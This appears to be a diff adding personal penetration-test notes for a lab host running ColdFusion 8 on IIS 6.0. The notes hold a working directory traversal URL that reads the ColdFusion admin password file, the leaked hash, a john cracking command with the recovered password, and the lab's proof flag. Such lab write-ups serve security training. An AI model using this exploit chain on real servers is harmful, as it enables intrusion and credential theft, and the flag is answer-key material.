@@ -1,0 +1,23 @@
+OS: Windows XP or Server 2003
+
+TCP Ports: 80, Microsoft IIS 6.0
+
+ColdFusion version 8,0,0,176276 (http://10.11.1.10/cfide/adminapi/base.cfc?wsdl)
+Admin password:
+#Fri Sep 23 18:27:15 PDT 2011 rdspassword=8(^\:(B\#ILU\\]AE2F+L;']2J %]*\:X\\A\=>\n password=AAFDC23870ECBCD3D557B6423A8982134E17927E encrypted=true 
+(http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en)
+
+hash-identifier: Possible Hashs:
+[+]  SHA-1
+[+]  MySQL5 - SHA-1(SHA-1($pass))
+
+
+john --show --format=Raw-SHA1 password
+pass123
+
+
+
+proof.txt:
+
+a416a831fddf36aa8c01ba0674ca7bf8
+
